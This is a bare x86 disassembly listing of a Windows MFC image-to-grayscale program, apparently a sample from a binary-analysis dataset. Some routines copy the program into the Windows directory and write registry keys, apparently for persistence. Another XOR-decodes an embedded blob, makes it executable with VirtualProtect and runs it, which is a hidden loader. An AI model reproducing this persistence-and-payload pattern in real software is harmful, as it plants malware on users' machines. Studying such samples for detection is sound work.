sub_401060
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
push edi
mov edi [ lstrcpynA@IAT ]
push 0x104
lea ecx [ esi + 0x104 ]
push eax
push ecx
call edi
mov edx [ esp + 0xc ]
push 0x104
push edx
push esi
call edi
pop edi
mov eax 0x1
pop esi
retn 0x8
sub_4010b0
sub esp 0x310
push ebx
push ebp
push esi
push edi
lea eax [ esp + 0x21c ]
push 0x104
push eax
mov ebx ecx
push 0x0
mov [ esp + 0x1c ] 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x118 ]
push 0x104
push ecx
call [ GetWindowsDirectoryA@IAT ]
mov edi [ sprintf@IAT ]
lea esi [ ebx + 0x104 ]
lea edx [ esp + 0x118 ]
push esi
push edx
lea eax [ esp + 0x1c ]
push rw-data
push eax
call edi
mov ebp [ MoveFileA@IAT ]
add esp 0x10
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x21c ]
push ecx
push edx
call ebp
test eax eax
jne r-xdata
lea edx [ esp + 0x10 ]
push edx
push rw-data
push 0x80000002
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x118 ]
push 0x104
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
lea ecx [ esp + 0x118 ]
push esi
push ecx
lea edx [ esp + 0x1c ]
push rw-data
push edx
call edi
add esp 0x10
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x21c ]
push eax
push ecx
call ebp
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x310
retn
mov esi [ lstrlenA@IAT ]
mov edi [ RegSetValueExA@IAT ]
xor ebp ebp
call esi
lea ecx [ esp + 0x14 ]
push eax
push ecx
push 0x1
push 0x0
push ebx
call esi
lea ecx [ esp + 0x14 ]
push eax
push ecx
push 0x1
push 0x0
push 0x0
jmp r-xdata
mov edx [ esp + 0x10 ]
push edx
call [ RegCloseKey@IAT ]
cmp ebp 0xa
jl r-xdata
mov edx [ esp + 0x24 ]
push edx
call edi
inc ebp
test eax eax
je r-xdata
push ebx
call esi
test eax eax
lea eax [ esp + 0x14 ]
push eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
xor ebp ebp
push eax
call [ RegCloseKey@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push 0x80000001
call [ RegCreateKeyA@IAT ]
call esi
push eax
lea eax [ esp + 0x18 ]
push eax
push 0x1
push 0x0
push ebx
call esi
push eax
lea eax [ esp + 0x18 ]
push eax
push 0x1
push 0x0
push 0x0
jmp r-xdata
cmp ebp 0xa
jl r-xdata
mov ecx [ esp + 0x24 ]
push ecx
call edi
inc ebp
test eax eax
je r-xdata
push ebx
call esi
lea edx [ esp + 0x14 ]
test eax eax
push edx
jg r-xdata
sub_401260
push 0xffffffff
push sub_40393b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
push edi
push 0x730
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp + 0x8 ] eax
test eax eax
mov [ esp + 0x18 ] 0x0
je r-xdata
xor esi esi
mov ecx eax
call sub_401390
mov esi eax
jmp r-xdata
push 0x0
push 0x15e5
push rw-data
mov ecx esi
mov [ esp + 0x24 ] 0xffffffff
mov [ esi ] 0x1
mov [ esi + 0x10c ] 0x1
call sub_4013b0
push eax
call ??2@YAPAXI@Z
add esp 0x4
mov edi eax
mov ecx esi
push edi
push 0x15e5
push rw-data
call sub_4013b0
lea ecx [ esp + 0xc ]
push ecx
push 0x40
push eax
push edi
call [ VirtualProtect@IAT ]
call edi
push rw-data
push rw-data
mov ecx rw-data
call sub_401060
mov ecx rw-data
call sub_4010b0
mov esi [ Sleep@IAT ]
push 0xffffffff
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x3e8
call esi
push 0x0
call [ exit@IAT ]
sub_4013b0
mov eax [ esp + 0x4 ]
mov edx ecx
push ebx
push ebp
mov ecx [ eax ]
push esi
mov [ edx + 0x108 ] ecx
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
mov ebp ecx
push edi
add esi eax
lea edi [ edx + 0x1 ]
mov ebx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ eax + 0xc ]
mov ecx [ edx + 0x10c ]
mov ebx [ ebx + 0x8 ]
add eax edi
dec ecx
jne r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
mov ecx [ esp + 0x1c ]
push ecx
push ebx
push eax
mov ecx edx
call sub_401410
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
sub_401410
push esi
push edi
mov edi ecx
mov ecx [ esp + 0x14 ]
mov esi [ edi + 0x108 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x10 ]
push ebx
xor ebx ebx
test edx edx
jbe r-xdata
mov eax [ esp + 0x10 ]
pop edi
add eax esi
pop esi
retn 0xc
pop ebx
pop edi
mov eax edx
pop esi
retn 0xc
push ebp
mov ebp [ esp + 0x14 ]
sub ebp ecx
lea eax [ edx - 0x14 ]
cmp ebx eax
jbe r-xdata
add ecx ebx
inc ebx
cmp ebx edx
jb r-xdata
push ecx
push rw-data
call [ printf@IAT ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
add esp 0x8
mov dl [ edi + eax + 0x1 ]
xor dl [ ecx + ebp ]
inc eax
cmp eax esi
mov [ ecx ] dl
jb r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
xor eax eax
test esi esi
jbe r-xdata
pop ebp
sub_401550
push 0xffffffff
push sub_403962
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push esi
mov esi ecx
push rw-data
call Ordinal_MFC42_6117
push 0x4
mov ecx esi
call Ordinal_MFC42_4159
push 0x6c
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp + 0x4 ] eax
test eax eax
mov [ esp + 0x34 ] 0x0
je r-xdata
xor eax eax
push r--data
push r--data
push r--data
push 0x80
mov ecx eax
call Ordinal_MFC42_520
jmp r-xdata
mov ecx [ esi + 0x20 ]
push 0x5
call Ordinal_MFC42_6215
mov esi [ esi + 0x20 ]
mov edx [ esi + 0x20 ]
push edx
call [ UpdateWindow@IAT ]
lea ecx [ esp + 0x8 ]
mov [ esp + 0x34 ] 0xffffffff
call Ordinal_MFC42_617
mov ecx [ esp + 0x2c ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
lea ecx [ esp + 0x8 ]
mov [ esp + 0x34 ] 0xffffffff
call Ordinal_MFC42_617
xor eax eax
pop esi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
add esp 0x34
retn
push eax
mov ecx esi
mov [ esp + 0x38 ] 0xffffffff
call Ordinal_MFC42_986
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_296
lea eax [ esp + 0x8 ]
mov ecx esi
push eax
mov [ esp + 0x38 ] 0x1
call Ordinal_MFC42_5214
lea ecx [ esp + 0x8 ]
push ecx
mov ecx esi
call Ordinal_MFC42_5301
test eax eax
jne r-xdata
sub_401710
push 0xffffffff
push sub_403978
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x60
lea ecx [ esp ]
call sub_401670
lea ecx [ esp ]
mov [ esp + 0x68 ] 0x0
call Ordinal_MFC42_2514
lea ecx [ esp ]
mov [ esp + 0x68 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn
sub_401770
push 0xffffffff
push sub_40399a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push 0x94
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx eax
call sub_401810
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401810
push 0xffffffff
push sub_4039c3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esp + 0xc ] esi
call Ordinal_MFC42_338
xor ebx ebx
lea edi [ esi + 0x54 ]
push ebx
mov ecx edi
mov [ esp + 0x1c ] ebx
call Ordinal_MFC42_543
mov [ edi ] r--data
add edi 0x8
push edi
call [ InitializeCriticalSection@IAT ]
push ebx
push ebx
push 0x1
push ebx
lea ecx [ esi + 0x74 ]
mov [ esp + 0x28 ] 0x1
call Ordinal_MFC42_348
mov ecx [ esp + 0x10 ]
mov [ esi + 0x88 ] ebx
mov [ esi + 0x84 ] r--data
mov [ esi + 0x90 ] ebx
mov [ esi + 0x8c ] r--data
mov [ esi ] r--data
mov [ esi + 0x7c ] ebx
mov [ esi + 0x80 ] ebx
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4018d0
push 0xffffffff
push sub_4039d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] r--data
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401970
push 0xffffffff
push sub_4039f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] r--data
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_4019e0
push 0xffffffff
push sub_403a18
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esi ] r--data
mov [ esp + 0x10 ] 0x0
call Ordinal_MFC42_2414
mov ecx [ esp + 0x8 ]
mov [ esi ] r--data
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_401af0
push 0xffffffff
push sub_403a6c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
mov [ esi ] r--data
mov [ esp + 0x18 ] 0x0
lea edi [ esi + 0x8c ]
mov [ esp + 0xc ] edi
mov [ edi ] r--data
mov ecx edi
mov [ esp + 0x18 ] 0x4
call Ordinal_MFC42_2414
mov [ edi ] r--data
lea edi [ esi + 0x84 ]
mov [ esp + 0xc ] edi
mov [ edi ] r--data
mov ecx edi
mov [ esp + 0x18 ] 0x5
call Ordinal_MFC42_2414
lea ecx [ esi + 0x74 ]
mov [ edi ] r--data
mov [ esp + 0x18 ] 0x1
call Ordinal_MFC42_663
lea edi [ esi + 0x54 ]
mov [ esp + 0x18 ] 0x0
lea eax [ edi + 0x8 ]
mov [ edi ] r--data
push eax
call [ DeleteCriticalSection@IAT ]
mov ecx edi
call Ordinal_MFC42_803
mov ecx esi
mov [ esp + 0x18 ] 0xffffffff
call Ordinal_MFC42_652
mov ecx [ esp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
sub_401bc0
push 0xffffffff
push sub_403a9e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x7c
push ebp
mov ebp ecx
push esi
push edi
mov eax [ ebp + 0x80 ]
mov [ esp + 0xc ] ebp
test eax eax
je r-xdata
mov esi [ esp + 0x98 ]
mov ecx ebp
push esi
call Ordinal_MFC42_4858
test eax eax
je r-xdata
push 0x0
push 0x0
push rw-data
call Ordinal_MFC42_1200
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x88 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x88
retn 0x4
push 0x2010
push 0x0
push 0x0
push 0x0
push esi
push 0x0
call [ LoadImageA@IAT ]
test eax eax
jne r-xdata
lea edi [ ebp + 0x8c ]
push eax
mov ecx edi
call Ordinal_MFC42_1641
push 0x0
lea ecx [ esp + 0x24 ]
call Ordinal_MFC42_289
mov edx [ esp + 0x28 ]
push 0x26
push edx
mov [ esp + 0x98 ] 0x1
call [ GetDeviceCaps@IAT ]
test ah 0x1
je r-xdata
lea ecx [ esp + 0xc ]
call Ordinal_MFC42_540
push esi
lea eax [ esp + 0x10 ]
push rw-data
push eax
mov [ esp + 0x9c ] 0x0
call Ordinal_MFC42_2818
mov ecx [ esp + 0x18 ]
add esp 0xc
push 0x0
push 0x0
push ecx
call Ordinal_MFC42_1200
lea ecx [ esp + 0xc ]
mov [ esp + 0x90 ] 0xffffffff
call Ordinal_MFC42_800
xor eax eax
jmp r-xdata
lea ecx [ esp + 0x20 ]
mov [ esp + 0x90 ] 0xffffffff
call Ordinal_MFC42_613
mov eax 0x1
test edi edi
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x90 ]
lea eax [ esp + 0x34 ]
push eax
push 0x54
push ecx
call [ GetObjectA@IAT ]
mov esi [ esp + 0x6c ]
test esi esi
jne r-xdata
cmp esi 0x100
jle r-xdata
mov cl [ esp + 0x5a ]
mov esi 0x1
shl esi cl
lea eax [ esi * 4 ]
push eax
call ??2@YAPAXI@Z
add esp 0x4
lea ecx [ esp + 0x10 ]
mov ebp eax
call Ordinal_MFC42_323
mov ecx [ esp + 0x24 ]
lea eax [ esp + 0x20 ]
neg eax
sbb eax eax
mov [ esp + 0x90 ] 0x2
and eax ecx
push eax
call [ CreateCompatibleDC@IAT ]
push eax
lea ecx [ esp + 0x14 ]
call Ordinal_MFC42_1640
test edi edi
je r-xdata
mov edx [ esp + 0x24 ]
push edx
call [ CreateHalftonePalette@IAT ]
push eax
lea ecx [ ebp + 0x84 ]
call Ordinal_MFC42_1641
jmp r-xdata
mov ecx [ esp + 0x14 ]
push edi
push ecx
call Ordinal_MFC42_5785
mov ecx [ esp + 0x14 ]
mov edi eax
lea eax [ esp + 0x10 ]
push ebp
neg eax
sbb eax eax
push esi
and eax ecx
push 0x0
push eax
call [ GetDIBColorTable@IAT ]
test edi edi
je r-xdata
mov edi [ edi + 0x4 ]
mov edx [ esp + 0x14 ]
push edi
push edx
call Ordinal_MFC42_5785
lea eax [ esi * 4 + 0x4 ]
push eax
call ??2@YAPAXI@Z
mov edi eax
add esp 0x4
test esi esi
mov [ edi ] 0x300
mov [ edi + 0x2 ] si
jle r-xdata
mov edi [ edi + 0x4 ]
push edi
call [ CreatePalette@IAT ]
push eax
mov eax [ esp + 0x10 ]
lea ecx [ eax + 0x84 ]
call Ordinal_MFC42_1641
push edi
call ??3@YAXPAX@Z
push ebp
call ??3@YAXPAX@Z
add esp 0x8
lea ecx [ esp + 0x10 ]
mov [ esp + 0x90 ] 0x1
call Ordinal_MFC42_640
lea eax [ edi + 0x5 ]
lea ecx [ ebp + 0x1 ]
mov dl [ ecx + 0x1 ]
add ecx 0x4
mov [ eax - 0x1 ] dl
mov dl [ ecx - 0x4 ]
mov [ eax ] dl
mov dl [ ecx - 0x5 ]
mov [ eax + 0x1 ] dl
mov [ eax + 0x2 ] 0x0
add eax 0x4
dec esi
jne r-xdata
sub_401e50
push esi
mov esi ecx
lea ecx [ esi + 0x8c ]
test ecx ecx
je r-xdata
lea ecx [ esi + 0x84 ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call Ordinal_MFC42_2399
pop esi
retn
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
call Ordinal_MFC42_2414
call Ordinal_MFC42_2414
sub_401ed0
push esi
mov esi ecx
push edi
push 0xffffffff
mov eax [ esi + 0x7c ]
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ esi + 0x7c ]
push ecx
call [ CloseHandle@IAT ]
lea edi [ esi + 0x84 ]
mov [ esi + 0x7c ] 0x0
test edi edi
mov [ esi + 0x80 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
mov ecx esi
call Ordinal_MFC42_6329
pop edi
pop esi
retn
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push ebx
mov ecx edi
call Ordinal_MFC42_2414
call sub_402730
mov ebx eax
push ebx
call [ CreatePalette@IAT ]
push eax
mov ecx edi
call Ordinal_MFC42_1641
push ebx
call ??3@YAXPAX@Z
add esp 0x4
pop ebx
sub_401f50
push esi
mov esi ecx
push 0xffffffff
mov eax [ esi + 0x7c ]
push eax
call [ WaitForSingleObject@IAT ]
mov ecx [ esi + 0x7c ]
push ecx
call [ CloseHandle@IAT ]
xor eax eax
mov [ esi + 0x7c ] eax
mov [ esi + 0x80 ] eax
pop esi
retn
sub_401f80
push esi
mov esi ecx
mov eax [ esi + 0x80 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
push eax
call [ SetEvent@IAT ]
pop esi
retn
mov [ esi + 0x80 ] 0x1
mov eax [ esi + 0x78 ]
push edi
push eax
call [ ResetEvent@IAT ]
push 0x14
call ??2@YAPAXI@Z
add esp 0x4
mov edi eax
call Ordinal_MFC42_1175
test eax eax
je r-xdata
xor eax eax
mov edx [ eax ]
mov ecx eax
call [ edx + 0x7c ]
jmp r-xdata
mov [ edi ] eax
push 0x0
lea eax [ esi + 0x8c ]
push 0x4
push 0x0
mov [ edi + 0x4 ] eax
push 0x0
lea ecx [ esi + 0x84 ]
lea edx [ esi + 0x54 ]
lea eax [ esi + 0x74 ]
push edi
push sub_4020b0
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov [ edi + 0x10 ] eax
call Ordinal_MFC42_1105
push 0x2
push 0x0
add esi 0x7c
push 0x0
push esi
mov esi [ GetCurrentProcess@IAT ]
mov edi eax
call esi
mov ecx [ edi + 0x2c ]
push eax
push ecx
call esi
push eax
call [ DuplicateHandle@IAT ]
mov edx [ edi + 0x2c ]
push edx
call [ ResumeThread@IAT ]
pop edi
pop esi
retn
sub_402040
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi ecx
mov eax [ edi + 0x80 ]
test eax eax
mov eax [ esi ]
je r-xdata
push rw-data
mov ecx esi
call [ eax + 0xc ]
lea eax [ edi + 0x8c ]
test eax eax
jne r-xdata
push rw-data
mov ecx esi
call [ eax + 0xc ]
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx ]
pop edi
pop esi
retn 0x4
mov eax [ eax + 0x4 ]
mov edx [ esi ]
xor ecx ecx
test eax eax
setne cl
push ecx
mov ecx esi
call [ edx ]
pop edi
pop esi
retn 0x4
mov edx [ esi ]
xor ecx ecx
test eax eax
setne cl
push ecx
mov ecx esi
call [ edx ]
pop edi
pop esi
retn 0x4
sub_4020b0
push 0xffffffff
push sub_403b3c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xdc
mov eax [ esp + 0xec ]
push ebx
push ebp
push esi
mov ecx [ eax + 0x8 ]
mov esi [ eax + 0x4 ]
mov edx [ eax + 0xc ]
push edi
mov edi [ eax ]
mov [ esp + 0x14 ] ecx
mov ecx [ eax + 0x10 ]
push eax
mov [ esp + 0x3c ] edi
mov [ esp + 0x98 ] esi
mov [ esp + 0x34 ] edx
mov [ esp + 0x90 ] ecx
call ??3@YAXPAX@Z
mov eax [ esi + 0x4 ]
add esp 0x4
lea edx [ esp + 0x98 ]
push edx
push 0x54
push eax
call [ GetObjectA@IAT ]
mov ebx [ esp + 0xa0 ]
mov ebp [ esp + 0x9c ]
push edi
lea ecx [ esp + 0x7c ]
mov [ esp + 0x94 ] ebx
call Ordinal_MFC42_289
lea ecx [ esp + 0x20 ]
mov [ esp + 0xf4 ] 0x0
call sub_402720
mov edi r--data
mov [ esp + 0x20 ] edi
lea ecx [ esp + 0x28 ]
mov [ esp + 0xf4 ] 0x1
call sub_402720
mov [ esp + 0x28 ] edi
mov ecx [ esp + 0x7c ]
mov edi [ CreateCompatibleBitmap@IAT ]
push ebx
push ebp
push ecx
mov [ esp + 0x100 ] 0x2
call edi
push eax
lea ecx [ esp + 0x24 ]
call Ordinal_MFC42_1641
mov edx [ esp + 0x7c ]
push ebx
push ebp
push edx
call edi
push eax
lea ecx [ esp + 0x2c ]
call Ordinal_MFC42_1641
lea ecx [ esp + 0x40 ]
call Ordinal_MFC42_323
lea ecx [ esp + 0x60 ]
mov [ esp + 0xf4 ] 0x3
call Ordinal_MFC42_323
mov ecx [ esp + 0x7c ]
lea eax [ esp + 0x78 ]
mov edi [ CreateCompatibleDC@IAT ]
mov [ esp + 0xf4 ] 0x4
neg eax
sbb eax eax
and eax ecx
push eax
call edi
push eax
lea ecx [ esp + 0x44 ]
call Ordinal_MFC42_1640
lea eax [ esp + 0x78 ]
neg eax
mov edx [ esp + 0x7c ]
sbb eax eax
and eax edx
push eax
call edi
push eax
lea ecx [ esp + 0x64 ]
call Ordinal_MFC42_1640
mov edx [ esp + 0x24 ]
lea eax [ esp + 0x20 ]
neg eax
sbb eax eax
and eax edx
push eax
mov eax [ esp + 0x48 ]
push eax
call Ordinal_MFC42_5785
mov edx [ esp + 0x2c ]
mov [ esp + 0x74 ] eax
mov ecx [ esp + 0x64 ]
lea eax [ esp + 0x28 ]
neg eax
sbb eax eax
and eax edx
push eax
push ecx
call Ordinal_MFC42_5785
mov [ esp + 0x70 ] eax
xor eax eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x34 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] r--data
mov edx [ esp + 0x14 ]
mov [ esp + 0xf4 ] 0x5
cmp [ edx + 0x4 ] eax
je r-xdata
lea ecx [ esp + 0x50 ]
call Ordinal_MFC42_323
mov edx [ esp + 0x7c ]
lea eax [ esp + 0x78 ]
neg eax
sbb eax eax
mov [ esp + 0xf4 ] 0x6
and eax edx
push eax
call edi
push eax
lea ecx [ esp + 0x54 ]
call Ordinal_MFC42_1640
mov edx [ esp + 0x30 ]
lea eax [ edx + 0x8 ]
push eax
call [ EnterCriticalSection@IAT ]
test esi esi
jne r-xdata
call sub_402730
push eax
mov [ esp + 0x14 ] eax
call [ CreatePalette@IAT ]
push eax
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_1641
mov eax [ esp + 0x10 ]
push eax
call ??3@YAXPAX@Z
add esp 0x4
lea ecx [ esp + 0x18 ]
push 0x0
push ecx
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_5791
mov edx [ esp + 0x14 ]
push 0x0
push edx
lea ecx [ esp + 0x68 ]
mov [ esp + 0x44 ] eax
call Ordinal_MFC42_5791
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x44 ]
push eax
call [ RealizePalette@IAT ]
mov ecx [ esp + 0x64 ]
push ecx
call [ RealizePalette@IAT ]
mov eax [ esi + 0x4 ]
xor eax eax
jmp r-xdata
mov edx [ esp + 0x54 ]
push edi
push edx
call Ordinal_MFC42_5785
mov ecx [ esp + 0x30 ]
mov eax [ ecx ]
call [ eax + 0x1c ]
xor edi edi
test ebx ebx
jle r-xdata
mov edi [ edi + 0x4 ]
push eax
mov eax [ esp + 0x58 ]
push eax
call Ordinal_MFC42_5785
mov ecx [ esp + 0x54 ]
mov edi eax
lea eax [ esp + 0x50 ]
push 0xcc0020
neg eax
sbb eax eax
push 0x0
and eax ecx
mov ecx [ esp + 0x6c ]
push 0x0
push eax
push ebx
push ebp
push 0x0
push 0x0
push ecx
call [ BitBlt@IAT ]
test edi edi
je r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x10 ] 0x0
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor esi esi
test ebp ebp
jle r-xdata
mov edi [ esp + 0x30 ]
lea eax [ edi + 0x8 ]
push eax
call [ EnterCriticalSection@IAT ]
test esi esi
jne r-xdata
lea ecx [ esp + 0x18 ]
push 0x0
push ecx
lea ecx [ esp + 0x58 ]
call Ordinal_MFC42_5791
mov edx [ esp + 0x54 ]
mov [ esp + 0x10 ] eax
push edx
call [ RealizePalette@IAT ]
mov ecx [ esp + 0x8c ]
push 0x0
mov edx [ ecx + 0x4 ]
push edx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x64 ]
push edi
push esi
push ecx
call [ GetPixel@IAT ]
xor ecx ecx
mov cl ah
and ecx 0xff
lea edx [ ecx * 8 ]
sub edx ecx
lea edx [ ecx + edx * 4 ]
lea edx [ ecx + edx * 2 ]
mov ecx eax
and eax 0xff
shr ecx 0x10
imul eax eax 0x1e
and ecx 0xff
lea ebx [ ecx + ecx * 4 ]
lea ecx [ ecx + ebx * 2 ]
add edx ecx
add edx eax
mov eax 0x51eb851f
mul edx
shr edx 0x5
mov [ esp + 0x10 ] dl
mov eax [ esp + 0x10 ]
and eax 0xff
mov edx eax
or dh 0x2
shl edx 0x8
or edx eax
shl edx 0x8
or edx eax
mov eax [ esp + 0x44 ]
push edx
push edi
push esi
push eax
call [ SetPixel@IAT ]
inc esi
cmp esi ebp
jl r-xdata
mov esi [ esi + 0x4 ]
jmp r-xdata
mov eax [ esp + 0x74 ]
test eax eax
je r-xdata
mov eax [ esp + 0x38 ]
inc edi
push ebx
push edi
mov ecx [ eax + 0x20 ]
push 0x501
push ecx
call [ SendMessageA@IAT ]
cmp edi ebx
jl r-xdata
mov ebx [ esp + 0x90 ]
mov edx [ esp + 0x54 ]
push esi
push edx
call Ordinal_MFC42_5785
mov eax [ edi ]
mov ecx edi
call [ eax + 0x1c ]
mov eax [ esp + 0x74 ]
test eax eax
je r-xdata
mov esi [ esi + 0x4 ]
mov eax [ esp + 0x54 ]
push esi
push eax
call Ordinal_MFC42_5785
mov edx [ esp + 0x44 ]
mov esi eax
lea eax [ esp + 0x40 ]
mov ecx [ esp + 0x54 ]
neg eax
sbb eax eax
push 0xcc0020
and eax edx
push 0x0
push 0x0
push eax
push ebx
push ebp
push 0x0
push 0x0
push ecx
call [ BitBlt@IAT ]
test esi esi
je r-xdata
mov edx [ esp + 0x44 ]
push eax
push edx
call Ordinal_MFC42_5785
mov eax [ esp + 0x70 ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
mov esi [ esp + 0x94 ]
mov ecx [ esp + 0x44 ]
push eax
push ecx
call Ordinal_MFC42_5785
mov eax [ esp + 0x70 ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
push eax
mov eax [ esp + 0x68 ]
push eax
call Ordinal_MFC42_5785
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
mov edx [ esp + 0x64 ]
push eax
push edx
call Ordinal_MFC42_5785
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x4 ]
mov ecx [ esp + 0x38 ]
inc edi
push 0x0
push edi
mov edx [ ecx + 0x20 ]
push 0x503
push edx
call [ PostMessageA@IAT ]
lea ecx [ esp + 0x50 ]
mov [ esp + 0xf4 ] 0x5
call Ordinal_MFC42_640
mov edi r--data
mov [ esp + 0x18 ] edi
lea ecx [ esp + 0x18 ]
mov [ esp + 0xf4 ] 0x7
call Ordinal_MFC42_2414
mov esi r--data
lea ecx [ esp + 0x60 ]
mov [ esp + 0x18 ] esi
mov [ esp + 0xf4 ] 0x3
call Ordinal_MFC42_640
lea ecx [ esp + 0x40 ]
mov [ esp + 0xf4 ] 0x2
call Ordinal_MFC42_640
mov [ esp + 0x28 ] edi
lea ecx [ esp + 0x28 ]
mov [ esp + 0xf4 ] 0x8
call Ordinal_MFC42_2414
mov [ esp + 0x28 ] esi
mov [ esp + 0x20 ] edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0xf4 ] 0x9
call Ordinal_MFC42_2414
lea ecx [ esp + 0x78 ]
mov [ esp + 0x20 ] esi
mov [ esp + 0xf4 ] 0xffffffff
call Ordinal_MFC42_613
or eax 0xffffffff
jmp r-xdata
mov edx [ esp + 0x3c ]
push 0x0
push edx
lea ecx [ esp + 0x48 ]
call Ordinal_MFC42_5791
mov eax [ esp + 0x34 ]
push 0x0
push eax
lea ecx [ esp + 0x68 ]
call Ordinal_MFC42_5791
mov ecx [ esp + 0x38 ]
push 0x0
push 0x0
push 0x502
mov edx [ ecx + 0x20 ]
push edx
call [ PostMessageA@IAT ]
lea ecx [ esp + 0x50 ]
mov [ esp + 0xf4 ] 0x5
call Ordinal_MFC42_640
mov edi r--data
mov [ esp + 0x18 ] edi
lea ecx [ esp + 0x18 ]
mov [ esp + 0xf4 ] 0xa
call Ordinal_MFC42_2414
mov esi r--data
lea ecx [ esp + 0x60 ]
mov [ esp + 0x18 ] esi
mov [ esp + 0xf4 ] 0x3
call Ordinal_MFC42_640
lea ecx [ esp + 0x40 ]
mov [ esp + 0xf4 ] 0x2
call Ordinal_MFC42_640
mov [ esp + 0x28 ] edi
lea ecx [ esp + 0x28 ]
mov [ esp + 0xf4 ] 0xb
call Ordinal_MFC42_2414
mov [ esp + 0x28 ] esi
mov [ esp + 0x20 ] edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0xf4 ] 0xc
call Ordinal_MFC42_2414
lea ecx [ esp + 0x78 ]
mov [ esp + 0x20 ] esi
mov [ esp + 0xf4 ] 0xffffffff
